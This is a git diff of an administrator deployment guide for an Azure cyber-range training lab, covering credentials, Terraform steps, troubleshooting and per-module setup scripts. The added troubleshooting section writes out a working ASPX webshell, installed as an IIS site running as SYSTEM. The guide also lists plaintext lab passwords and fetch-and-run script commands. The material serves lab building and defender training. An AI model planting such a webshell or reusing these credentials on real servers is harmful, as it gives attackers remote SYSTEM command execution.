@@ -2,16 +2,16 @@
 
 This guide is for administrators deploying the OpenRaptor Cyber Range in a new Azure tenant.
 
-> ## 🚀 How was your lab deployed?
+> ## 🚀 Lab deployed by OD@CIRT.APAC?
 >
-> | Deployment method | Go to |
-> |-------------------|-------|
-> | **OD@CIRT.APAC deployed it for you** | Jump to [Lab Administration — Per-Module Scripts](#lab-administration--per-module-scripts) — your lab is ready |
-> | **Self-hosting (manual, no Terraform)** | **[Self-Deployment Guide](self-deployment-guide.md)** — full Azure CLI + PowerShell walkthrough |
-> | **Self-hosting (Terraform)** | Continue with Steps 1–8 below |
+> If OD@CIRT.APAC has deployed and handed over this lab environment to you, **your lab is ready — no setup required.**
+>
+> | Role | Go to |
+> |------|-------|
+> | 🧑‍💼 **Tenant Admin** | Jump to [Lab Administration — Per-Module Scripts](#lab-administration--per-module-scripts) — everything is pre-deployed, just run and reset modules |
 > | 🎓 **Student** | [Student Lab Guide](lab-guide/01-sharepoint-webshell.md) — start your training directly |
 >
-> ⬇️ Steps 1–8 below use Terraform and golden images. For a manual deployment, see the [Self-Deployment Guide](self-deployment-guide.md).
+> ⬇️ **Steps 1–8 below** are only needed if you are self-hosting and deploying the lab from scratch in your own Azure subscription.
 
 ---
 
@@ -41,39 +41,18 @@ This guide is for administrators deploying the OpenRaptor Cyber Range in a new A
 
 ## Credential Reference (Canonical)
 
-> **Do not guess passwords. This table is the system of record. Updated: 2026-03-11**
-
-### Local Accounts (Bastion access — available from first boot)
-
-> Use local accounts for Bastion RDP/SSH immediately after deploy. No domain prefix required.
-
-| Account | Username | Password | Notes |
-|---------|----------|----------|-------|
-| Local admin (all VMs) | `cirtadmin` | `Norca@2024!` | Admin Bastion access. Available from first boot. |
-
-### Domain Accounts (available after DC01 fully provisioned, ~15-20 min post-deploy)
-
-> Students always use domain accounts — by handover time DC01 is fully up.
+> **Do not guess passwords. This table is the system of record. Updated: 2026-03-09**
 
 | Class | Account(s) | Password | Notes |
 |-------|-----------|----------|-------|
-| Domain Admin | `NORCA\cirtadmin`, `NORCA\Administrator` | `Norca@2024!` | Admin use only — do not share with students |
-| **Student Bastion login** | `cirtstudent@norca.click` | `CirtApacStudent2026` | Domain account — students use this for Bastion RDP/SSH |
+| Domain Admin | `NORCA\cirtadmin`, `NORCA\Administrator` | `CirtApacAdm!n2026` | Do not share with students |
+| Student login | `NORCA\cirtstudent`, `cirtstudent@norca.click` | `CirtApacStudent2026` | Lab login for students |
 | Scenario character | `NORCA\j.chen` | `CirtApacStudent2026` | Finance Analyst — compromised in scenario |
 | **Service account** | `NORCA\svc-sp-farm` | **`Norca@2024!`** | **Baked in golden image — do not rotate** |
 | **Service account** | `NORCA\svc-sp-app` | **`Norca@2024!`** | **Baked in golden image — do not rotate** |
-| **Service account** | `NORCA\svc-sp-search` | **`Norca@2024!`** | **Baked in golden image — do not rotate** |
 | Handover encryption | _(7-Zip archive)_ | `CirtAPACR@ptor` | Standard handover zip password |
 
-> #### Bastion Account Summary
-> | Who | Account | Password | When works |
-> |-----|---------|----------|------------|
-> | 🔧 Admin | `cirtadmin` (local, no prefix) | `Norca@2024!` | First boot onwards |
-> | 🎓 Student | `cirtstudent@norca.click` (domain) | `CirtApacStudent2026` | After DC01 provisioned + seed script run |
-
-> ⚠️ Service accounts (`svc-sp-farm`, `svc-sp-app`, `svc-sp-search`) must use `Norca@2024!` — this is baked into the SP01 golden image. Using any other password will cause SharePoint services to fail on startup.
-
-> ℹ️ **Bastion access:** Use **local** `cirtadmin` / `Norca@2024!` — available from first boot on all VMs (set via `osProfile` at provisioning). Do NOT use `NORCA\cirtadmin` for Bastion — the domain account requires DC01 to be fully provisioned first.
+> ⚠️ Service accounts (`svc-sp-farm`, `svc-sp-app`) must use `Norca@2024!` — this is baked into the SP01 golden image. Using any other password will cause SharePoint services to fail on startup.
 
 
 ## Step 1 — Create a Service Principal
@@ -108,7 +87,7 @@ Save the output — you'll need it in Step 3:
 ## Step 2 — Clone the Repo
 
 ```bash
-git clone https://github.com/birdforce14d/OpenRaptor.git
+git clone https://github.com/<your-org>/OpenRaptor.git
 cd OpenRaptor
 ```
 
@@ -145,7 +124,7 @@ sp01_image_id = "/CommunityGalleries/<COMMUNITY_GALLERY_NAME>/Images/sp01-module
 dc01_image_id = "/CommunityGalleries/<COMMUNITY_GALLERY_NAME>/Images/dc01-base-specialized/Versions/1.0.0"
 
 # Kali post-deploy setup script (pull from OpenRaptor — public)
-kali_setup_script_url = "https://raw.githubusercontent.com/birdforce14d/OpenRaptor/main/scenarios/module-01-webshell/admin/kali_01_setup.sh"
+kali_setup_script_url = "https://raw.githubusercontent.com/<your-org>/OpenRaptor/main/scenarios/module-01-webshell/admin/kali_01_setup.sh"
 
 # Infrastructure
 bastion_sku   = "Standard"
@@ -169,10 +148,10 @@ Set your admin password as an environment variable (do not put it in the vars fi
 
 ```bash
 # Bash
-export TF_VAR_admin_password="Norca@2024!"
+export TF_VAR_admin_password="CirtApacAdm!n2026"
 
 # PowerShell
-$env:TF_VAR_admin_password = "Norca@2024!"
+$env:TF_VAR_admin_password = "CirtApacAdm!n2026"
 ```
 
 > ⚠️ **Never commit `terraform.tfvars` to Git.** It contains your subscription ID and is in `.gitignore` by default.
@@ -393,7 +372,7 @@ After all VMs are running, stage the scenario toolkit for Module 01. Run this fr
 ```powershell
 # On DC01 — stage Module 01 toolkit
 # Downloads from OpenRaptor, stages on Kali01, seeds j.chen account
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/birdforce14d/OpenRaptor/main/scripts/lab_01_setup.ps1" -OutFile "C:\lab_01_setup.ps1"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/<your-org>/OpenRaptor/main/scripts/lab_01_setup.ps1" -OutFile "C:\lab_01_setup.ps1"
 .\lab_01_setup.ps1
 ```
 
@@ -485,18 +464,6 @@ terraform destroy -auto-approve
 
 ## Troubleshooting
 
-### Windows Server Activation Warning on DC01 or SP01
-
-After deploying from Community Gallery images, you may see a popup: _"Windows isn't activated. Activate Windows now."_ This is cosmetic — the VM is fully functional.
-
-**Fix:**
-```powershell
-slmgr /skms kms.core.windows.net:1688
-slmgr /ato
-```
-
-This points the VM to Azure's KMS server for activation. The warning will disappear after a few minutes. If `slmgr /ato` returns an error, ensure the VM has outbound internet access on port 1688.
-
 ### SP01 SharePoint not responding after reboot
 
 If SP01 becomes unresponsive after a reboot, use the reset script to rebuild from the golden image:
@@ -518,8 +485,53 @@ Test-NetConnection -ComputerName 10.10.1.10 -Port 389
 
 # Attempt rejoin
 $cred = Get-Credential  # DOMAIN\cirtadmin
-Add-Computer -DomainName "norca.click" -Credential $cred -Force -Restart
+Add-Computer -DomainName "{{DOMAIN}}" -Credential $cred -Force -Restart
 ```
+
+### ShellSite (port 8080) returns 500.19 or connection refused
+The lab setup script creates a **local IIS site** (`ShellSite`) on port **8080** with a minimal `cmd.aspx` webshell in `C:\inetpub\shell`. This is **admin-only** and used to validate local command execution during lab setup.
+
+If you hit **HTTP 500.19** (`0x80070003`) or can’t connect:
+
+```powershell
+# Recreate folder + minimal web.config
+New-Item -ItemType Directory -Force -Path C:\inetpub\shell | Out-Null
+@"<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+  <system.webServer>
+    <staticContent/>
+  </system.webServer>
+</configuration>
+"@ | Out-File -FilePath "C:\inetpub\shell\web.config" -Encoding UTF8
+
+# Recreate cmd.aspx
+@"<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%
+string cmd = Request.QueryString["cmd"];
+Process p = new Process();
+p.StartInfo.FileName = "cmd.exe";
+p.StartInfo.Arguments = "/c " + cmd;
+p.StartInfo.UseShellExecute = false;
+p.StartInfo.RedirectStandardOutput = true;
+p.Start();
+Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
+%>
+"@ | Out-File -FilePath "C:\inetpub\shell\cmd.aspx" -Encoding UTF8
+
+# Ensure IIS site + app pool
+$appcmd = "$env:windir\System32\inetsrv\appcmd.exe"
+& $appcmd add apppool /name:"ShellPool" /managedRuntimeVersion:"v4.0" /processModel.identityType:LocalSystem /startMode:AlwaysRunning
+& $appcmd add site /name:"ShellSite" /bindings:"http/*:8080:" /physicalPath:"C:\inetpub\shell"
+& $appcmd set app "ShellSite/" /applicationPool:"ShellPool"
+& $appcmd start site "ShellSite"
+```
+
+Verify:
+```powershell
+curl.exe http://localhost:8080/cmd.aspx?cmd=whoami
+```
+Expected output: `nt authority\\system`.
 
 ### Log Analytics not receiving data
 - Check VM extensions are installed: Portal → VM → Extensions
@@ -530,37 +542,6 @@ Add-Computer -DomainName "norca.click" -Credential $cred -Force -Restart
 - Verify Bastion is in `AzureBastionSubnet` (exact name required)
 - Check NSG on Bastion subnet allows inbound 443 from Internet
 - Confirm VM is running (not deallocated)
-- **Always use local `cirtadmin` account (no domain prefix) — not `NORCA\cirtadmin`**
-- Students use `cirtstudent@norca.click` (domain) — only works after seed script has run
-
-#### Kali01 SSH via Bastion fails
-Kali uses SSH (not RDP). Two common blockers:
-
-1. **`PasswordAuthentication no`** — cloud-init drops `/etc/ssh/sshd_config.d/50-cloud-init.conf` overriding `sshd_config`. Fix:
-   ```bash
-   sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config.d/50-cloud-init.conf
-   systemctl restart ssh
-   ```
-2. **Missing Bastion inbound NSG rule** — `nsg-attacker` must allow inbound TCP 22 from `AzureBastionSubnet` (`10.10.0.0/26`). Check with:
-   ```bash
-   az network nsg rule list -g rg-cirtlab-network --nsg-name nsg-attacker --query "[?direction=='Inbound']" -o table
-   ```
-   Both fixes are baked into Terraform (`ca9dcf9` / `8d09976`) — only needed if deploying from old state.
-
-3. **`cirtadmin` password not set after fresh deploy** — The Kali community gallery image may boot with a different default password than what Terraform provisioned. Symptom: Bastion SSH shows `authentication failure` for `cirtadmin` in `/var/log/auth.log`. Fix via Azure Run Command:
-   ```bash
-   az vm run-command invoke \
-     --subscription <SUBSCRIPTION_ID> \
-     -g rg-cirtlab-attacker -n kali01 \
-     --command-id RunShellScript \
-     --scripts "echo 'cirtadmin:Norca@2024!' | chpasswd && echo done"
-   ```
-   This is permanently fixed in Terraform from commit `0b63b06` — the CSE now explicitly runs `chpasswd` on every deploy. If you hit this on a deploy from older code, pull latest `main` and re-run `terraform apply`.
-
-#### SP01/DC01 RDP via Bastion fails  
-1. **Wrong account** — use local `cirtadmin` (no domain prefix), not `NORCA\cirtadmin`
-2. **Tag policy blocking password reset** — our `require-lab-tags` policy blocks `VMAccessExtension` and `run-command` resources without tags. The DC01 `reset_passwords` run command now has `tags = var.tags` (`cfee764`). If hitting this on old state, create a temporary policy exemption on the RG, reset, then remove.
-3. **NSG missing Bastion rule** — `nsg-target` must allow inbound TCP 3389 from `10.10.0.0/26`
 
 ---
 
@@ -586,28 +567,31 @@ Every module ships **three admin scripts** (run from DC01) and **one student scr
 ### Module 01 — SharePoint Webshell (`lab_01_sp_webshell`)
 
 **Before first student (or after new deployment):**
-
-1. Bastion into **DC01** — `cirtadmin` / `Norca@2024!`
-2. Open PowerShell as Administrator
-3. Download and run setup script:
 ```powershell
-# Download from raptor-infra repo
-$url = "https://raw.githubusercontent.com/birdforce14d/raptor-infra/main/scripts/lab_01_setup.ps1"
-Invoke-WebRequest $url -OutFile C:\lab_01_setup.ps1
-Set-ExecutionPolicy Bypass -Scope Process -Force
-C:\lab_01_setup.ps1
+# On DC01, as Domain Admin
+.\scenarios\module-01-webshell\admin\lab_01_setup.ps1
 ```
-Creates AD accounts (`j.chen`, `cirtstudent`), grants student RBAC, verifies DNS, configures SP01 IIS, creates SharePoint document libraries.
+Creates j.chen account, deploys webshell IIS site on SP01, stages toolkit on Kali.
+
+> ⚠️ **IIS setup uses appcmd.exe — do NOT use `Import-Module WebAdministration` via `az run-command`.**
+> `az vm run-command` spawns a 32-bit WOW64 PowerShell process. WebAdministration cmdlets in that context
+> write to `C:\Windows\SysWOW64\inetsrv\config\applicationHost.config` — **not** the real IIS config at
+> `System32\inetsrv\config\`. IIS never reads the WOW64 copy, so the site/pool never appears.
+> `lab_01_setup.ps1` calls `sp01-webshell-setup.ps1` which uses `appcmd.exe` directly — this always
+> writes to the correct config. If you need to rebuild the webshell site manually, run
+> `sp01-webshell-setup.ps1` directly on SP01 (RDP or appcmd via run-command).
 
 **Verify lab is ready:**
 ```powershell
-$url = "https://raw.githubusercontent.com/birdforce14d/raptor-infra/main/scripts/validate-lab.sh"
-# Run from Kali01 via SSH:
-# bash <(curl -s $url)
+.\scenarios\module-01-webshell\admin\lab_01_check.ps1
 ```
+Checks DC01, SP01 (:80 + :8080 webshell), j.chen auth, Kali toolkit, clean state.
 
 **Reset between students:**
-> `lab_01_reset.ps1` — not yet implemented. Current process: re-run `lab_01_setup.ps1` to restore clean state.
+```powershell
+.\scenarios\module-01-webshell\admin\lab_01_reset.ps1
+```
+Rebuilds SP01 from **`sp01-module01-student` (noWS)** golden image, then re-runs setup. Reset time: ~12 minutes.
 
 **Student preflight (student runs from Kali01):**
 ```bash
@@ -690,10 +674,10 @@ terraform apply -target module.sp01 -auto-approve
 **Step 1 — Attempt recovery first:**
 ```bash
 # Try a restart
-az vm restart -g rg-cirtlab-core -n dc01
+az vm restart -g <YOUR_RESOURCE_GROUP> -n dc01
 
 # Check AD DS service
-az vm run-command invoke -g rg-cirtlab-core -n dc01 \
+az vm run-command invoke -g <YOUR_RESOURCE_GROUP> -n dc01 \
   --command-id RunPowerShellScript \
   --scripts "Get-Service NTDS,DNS,Netlogon | Select Name,Status"
 ```
@@ -716,7 +700,7 @@ terraform apply -target module.sp01 -auto-approve
 
 **Step 3 — Verify AD DS:**
 ```bash
-az vm run-command invoke -g rg-cirtlab-core -n dc01 \
+az vm run-command invoke -g <YOUR_RESOURCE_GROUP> -n dc01 \
   --command-id RunPowerShellScript \
   --scripts "
 Get-Service NTDS,DNS,Netlogon | Select Name,Status
@@ -733,14 +717,14 @@ Kali is deployed from **Azure Marketplace** (not Community Gallery — Marketpla
 
 ```bash
 # Delete the existing Kali VM
-az vm delete --resource-group rg-cirtlab-core --name kali01 --yes
+az vm delete --resource-group <YOUR_RESOURCE_GROUP> --name kali01 --yes
 
 # Accept Marketplace terms (if not already done)
 az vm image terms accept --publisher kali-linux --offer kali-linux --plan kali
 
 # Redeploy from Marketplace
 az vm create \
-  --resource-group rg-cirtlab-core \
+  --resource-group <YOUR_RESOURCE_GROUP> \
   --name kali01 \
   --image "kali-linux:kali:kali-2025-4:latest" \
   --size Standard_D2s_v3 \
@@ -758,7 +742,7 @@ az vm create \
 - Installs: `curl`, `nmap`, `impacket`, `crackmapexec`, `evil-winrm`, `responder`
 - Creates `/opt/raptor/` directory structure
 - Pulls module scripts from OpenRaptor
-- Network pre-configured for lab VNet (`10.10.2.x` subnet)
+- Network pre-configured for lab VNet (`10.10.3.x` subnet)
 
 ---
 
@@ -789,7 +773,7 @@ Full rebuild: ~45–60 minutes.
 ## Security Notes
 
 - No VMs have public IP addresses — all access via Bastion only
-- Azure Policy denies public IP creation in `rg-cirtlab-core`
+- Azure Policy denies public IP creation in `<YOUR_RESOURCE_GROUP>`
 - All simulations are **benign** — no real malware, no live exploits
 - Do not connect this lab to production systems
 - Rotate admin credentials after initial setup
@@ -798,7 +782,7 @@ Full rebuild: ~45–60 minutes.
 
 ## Support
 
-For issues, open a GitHub issue at [birdforce14d/OpenRaptor](https://github.com/birdforce14d/OpenRaptor/issues).
+For issues, open a GitHub issue at [<your-org>/OpenRaptor](https://github.com/<your-org>/OpenRaptor/issues).
 
 ---
 
